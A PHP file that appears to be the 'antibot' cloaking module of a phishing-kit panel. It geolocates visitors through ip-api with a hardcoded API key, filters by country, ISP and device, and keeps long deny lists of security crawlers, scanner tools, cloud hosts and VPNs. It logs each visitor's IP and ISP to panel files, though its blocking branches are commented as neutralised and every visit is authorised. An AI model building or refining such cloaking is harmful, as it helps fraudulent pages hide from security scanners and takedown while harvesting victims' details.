<?php
declare(strict_types=1);
date_default_timezone_set('Europe/Paris');

/* -------------------------------------------------------------------------- */
/* Configuration                                                              */
/* -------------------------------------------------------------------------- */
$apiKey      = 'QqyiAbxJ5x0Iqsf'; 
$paths       = [
    'whitelist'   => __DIR__ . '/../Panel/config/whitelist.txt',
    'bannedIPs'   => __DIR__ . '/../Panel/logs/ip_ban.txt',
    'banLog'      => __DIR__ . '/../Panel/logs/banned_visits.txt',
    'visitLog'    => __DIR__ . '/../Panel/logs/click.json',
    'antibotConf' => __DIR__ . '/../Panel/config/antibots_config.json',
    'allowedISPs' => __DIR__ . '/allowed_isps.json',
];
$redirectURL = 'https://google.com';

/* -------------------------------------------------------------------------- */
/* Fonctions Utilitaires                                                      */
/* -------------------------------------------------------------------------- */
if (!function_exists('getUserIP')) {
    function getUserIP(): string {
        foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $key) {
            if (!empty($_SERVER[$key])) {
                $ipList = explode(',', (string)$_SERVER[$key]);
                return trim(reset($ipList));
            }
        }
        return 'UNKNOWN';
    }
}

if (!function_exists('logBlockedVisit')) {
    function logBlockedVisit(string $ip, string $country, string $isp, string $reason, string $logFile): void {
        $timestamp = date('Y-m-d H:i:s');
        file_put_contents(
            $logFile,
            "[$timestamp] IP: $ip | Country: $country | ISP: $isp | Reason: $reason" . PHP_EOL,
            FILE_APPEND | LOCK_EX
        );
    }
}

if (!function_exists('exitWithBan')) {
    function exitWithBan(string $url): void {
        return; 
    }
}

if (!function_exists('isBotUserAgent')) {
    function isBotUserAgent(): bool {
        $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
        $bots = [
            'bot', 'crawl', 'crawler', 'spider', 'checker', 'preview', 'monitor', 'scan',
            'wget', 'curl', 'httpclient', 'python', 'php', 'java', 'go-http-client',
            'libwww', 'perl', 'scrapy', 'axios', 'aiohttp', 'node-fetch', 'restsharp',
            'powershell', 'http_request2', 'lwp::simple', 'okhttp', 'urllib', 'httpie',
            'fetch', 'headless', 'phantomjs', 'selenium', 'mechanize', 'postmanruntime',
            'httpunit', 'capybara', 'puppeteer', 'playwright', 'nutch', 'htmlunit',
            'k6', 'loader.io', 'newrelicpinger', 'statuscake', 'uptimerobot',
            'facebookexternalhit', 'facebot', 'facebookbot', 'instagram', 'whatsapp',
            'twitterbot', 'slackbot', 'discordbot', 'telegrambot', 'linkedinbot',
            'googlebot', 'adsbot-google', 'mediapartners-google', 'apis-google',
            'bingbot', 'yandexbot', 'baiduspider', 'duckduckbot', 'sogou',
            'exabot', 'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'zoominfobot',
            'google-structured-data-testing-tool', 'siteauditbot', 'amazonbot',
            'bytespider', 'ccbot', 'pinterestbot', 'yahoo! slurp', 'qwantbot',
            'archive.org_bot', 'petalbot', 'searchmetricsbot', 'seokicks-robot',
            'trendictionbot', 'semrush', 'uptime', 'crawler4j', 'google llc', 'cloudflare',
        ];
        foreach ($bots as $bot) {
            if (strpos($ua, $bot) !== false) return true;
        }
        return false;
    }
}

if (!function_exists('getUserDevice')) {
    function getUserDevice(): string {
        $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
        return preg_match('/mobile|iphone|android|ipad|ipod/', $ua) ? 'mobile' : 'desktop';
    }
}

/* -------------------------------------------------------------------------- */
/* Chargement Configs                                                         */
/* -------------------------------------------------------------------------- */
$ip = getUserIP();

$allowedIPs = file_exists($paths['whitelist'])
    ? array_map('trim', file($paths['whitelist'], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES))
    : [];

if (in_array($ip, $allowedIPs, true)) {
    return;
}

$antibotsConfig = json_decode(@file_get_contents($paths['antibotConf']), true);
$allowedISPs    = json_decode(@file_get_contents($paths['allowedISPs']), true);

if (!$antibotsConfig || !$allowedISPs) {
    return;
}

if (file_exists($paths['bannedIPs'])) {
    $bannedIPs = file($paths['bannedIPs'], FILE_IGNORE_NEW_LINES);
    if (in_array($ip, $bannedIPs, true)) {
        return;
    }
}

/* -------------------------------------------------------------------------- */
/* Requête IP-API                                                             */
/* -------------------------------------------------------------------------- */
$apiUrl = sprintf(
    'http://pro.ip-api.com/json/%s?key=%s&fields=status,message,countryCode,proxy,query,isp,mobile,hosting,as',
    urlencode($ip),
    urlencode($apiKey)
);
$response = @file_get_contents($apiUrl);
$data     = json_decode((string)$response, true);

if (!$data || ($data['status'] ?? '') !== 'success') {
    return;
}

$country   = strtoupper($data['countryCode'] ?? 'UNKNOWN');
$isp       = $data['isp'] ?? 'UNKNOWN';
$asname    = strtoupper($data['as'] ?? 'UNKNOWN');
$device    = getUserDevice();
$isProxy   = (bool)($data['proxy'] ?? false);
$isHosting = (bool)($data['hosting'] ?? false);
$isBot     = isBotUserAgent();

/* -------------------------------------------------------------------------- */
/* Validation Pays + ISP                                                      */
/* -------------------------------------------------------------------------- */
$countryValid = in_array($country, $antibotsConfig['allowed_countries'] ?? [], true);
$deviceValid  = in_array($device, $antibotsConfig['devices'] ?? [], true);
$ispValid     = false;

if (isset($allowedISPs[$country])) {
    foreach ($allowedISPs[$country] as $allowed) {
        if (stripos($isp, $allowed) !== false || stripos($asname, $allowed) !== false) {
            $ispValid = true;
            break;
        }
    }
}

/* -------------------------------------------------------------------------- */
/* Blocage Cloud/Proxy/Hosting (Neutralisé)                                   */
/* -------------------------------------------------------------------------- */
$cloudISPs = [ 'GOOGLE', 'amazonaws.com', 'googleusercontent.com', 'digitalocean.com', 'ovh.net', 'ovhcloud.com', 'google.com', 'm247.com', 'hetzner.de', 'contabo.net', 'choopa.net', 'linode.com', 'kimsufi.com', 'rackspace.com', 'azure.com', 'vultr.com', 'netcup.net', 'scaleway.com', 'leaseweb.com', 'softlayer.com', 'cloudways.com', 'cloudsigma.com', 'cloudflare.com', 'nocix.net', 'colo-crossing.com', 'servdiscount-customer.com', 'your-server.de', 'hostwindsdns.com', 'onetelecom.pt', 'aeza.network', 'GOOGLE LLC', 'AMAZON', 'AMAZON.COM', 'AMAZON TECHNOLOGIES', 'MICROSOFT', 'MICROSOFT CORPORATION', 'AZURE', 'DIGITALOCEAN', 'HETZNER', 'OVH', 'CLOUDFLARE', 'LINODE', 'LEASEWEB', 'CONTABO', 'SCALeway', 'ORACLE', 'VULTR', 'FASTLY', 'G-CORE', 'M247', 'CHOOPA', 'ALIBABA', 'TENCENT', 'NETCUP', 'COLOCROSSING', 'QUADRANET', 'HOSTINGER', 'NFORCE', 'EONIX', 'IBM', 'IONOS', 'ZARE', 'UHOST', 'LLHOST', 'SOFTLAYER', 'VPSFAST', 'FLY.IO', 'ZOMRO', 'TIME4VPS', 'BUYVM', 'VPN', 'TOR', 'MULLVAD', 'PROTON', 'NORDVPN', 'CYBERGHOST', 'TUNNELBEAR', 'SAFERVPN', 'PRIVATE INTERNET ACCESS', 'WIREGUARD', 'SOCKS5', 'OPENVPN', 'BROWSEC' ];

if (!$ispValid) {
    foreach ($cloudISPs as $blocked) {
        if (stripos($isp, $blocked) !== false || stripos($asname, $blocked) !== false) {
            // Neutralisé
        }
    }
}

/* -------------------------------------------------------------------------- */
/* Nouvelle logique d'autorisation personnalisée                              */
/* -------------------------------------------------------------------------- */
$authorized = true; 

/* -------------------------------------------------------------------------- */
/* Log de visite                                                              */
/* -------------------------------------------------------------------------- */
$visitEntry = [
    'ip'         => $ip,
    'country'    => $country,
    'isp'        => $isp,
    'asname'     => $asname,
    'device'     => $device,
    'authorized' => $authorized,
    'reason'     => 'Authorized',
    'date' => date('Y-m-d H:i:s'),
];

$allVisits   = file_exists($paths['visitLog']) ? (json_decode(file_get_contents($paths['visitLog']), true) ?: []) : [];
$allVisits[] = $visitEntry;
file_put_contents($paths['visitLog'], json_encode($allVisits, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);

/* -------------------------------------------------------------------------- */
/* Blocage final (Neutralisé)                                                 */
/* -------------------------------------------------------------------------- */
if (!$authorized) {
    // Neutralisé
}
?>